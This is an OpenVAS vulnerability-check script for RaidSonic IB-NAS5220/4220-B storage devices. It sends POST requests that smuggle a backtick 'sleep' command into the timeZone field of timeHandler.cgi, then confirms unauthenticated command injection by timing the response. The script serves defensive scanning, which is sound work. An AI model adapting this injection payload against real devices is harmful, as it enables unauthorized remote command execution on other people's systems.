###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_nas_57958.nasl 11 2013-10-27 10:12:02Z jan $
#
# RaidSonic IB-NAS5220 and IB-NAS4220-B Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103793";

tag_insight = "The remote NAS is prone to:
1. An authentication-bypass vulnerability
2. An HTML-injection vulnerability
3. A command-injection vulnerability";

tag_impact = "The attacker may leverage these issues to bypass certain security
restrictions and perform unauthorized actions or execute HTML and
script code in the context of the affected browser, potentially
allowing the attacker to steal cookie-based authentication
credentials, control how the site is rendered to the user, or inject
and execute arbitrary commands.";

tag_affected = "It seems that not only RaidSonic IB-NAS5220 and IB-NAS422-B are prone to this
vulnerabilities. We've seen devices from Toshiba, Sarotech, Verbatim and others where it also
was possible to execute commands using the same exploit. Looks like these devices are using
the same firmware.";

tag_summary = "RaidSonic IB-NAS5220 and IB-NAS422-B are prone to multiple security
vulnerabilities.";

tag_solution = "Ask the Vendor for an update.";
tag_vuldetect = "Try to execute the 'sleep'  command on the device with a special crafted POST request.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(57958);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("RaidSonic IB-NAS5220 and IB-NAS4220-B Multiple Security Vulnerabilities");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57958");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-09-24 12:37:41 +0200 (Tue, 24 Sep 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("host_details.inc");

port = get_http_port(default: 80);
if(!get_port_state(port))exit(0);

url = '/login.cgi';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("/loginHandler.cgi" >!< buf && "focusLogin()" >!< buf)exit(0);

sleep = make_list(3, 5, 8);

foreach i (sleep) {

  ex = 'month=1&date=1&year=2007&hour=12&minute=10&ampm=PM&timeZone=Amsterdam`sleep%20' + i  + '`&ntp_type=default&ntpServer=none&old_date=+1+12007&old_time=1210&old_timeZone=Amsterdam&renew=0';
  len = strlen(ex);

  req = 'POST /cgi/time/timeHandler.cgi HTTP/1.1\r\n' +
        'Host: localhost\r\n' +
        'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0;OpenVAS;\r\n' +
        'Accept-Encoding: identity\r\n' +
        'Proxy-Connection: keep-alive\r\n' +
        'Referer: http://192.168.178.41/cgi/time/time.cgi\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        ex;


  start = unixtime();
  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);
  stop = unixtime();

  if("200 OK" >!< buf)exit(0);

  if(stop - start < i || stop - start > (i+5)) exit(99);

}

security_hole(port:port);
exit(0);

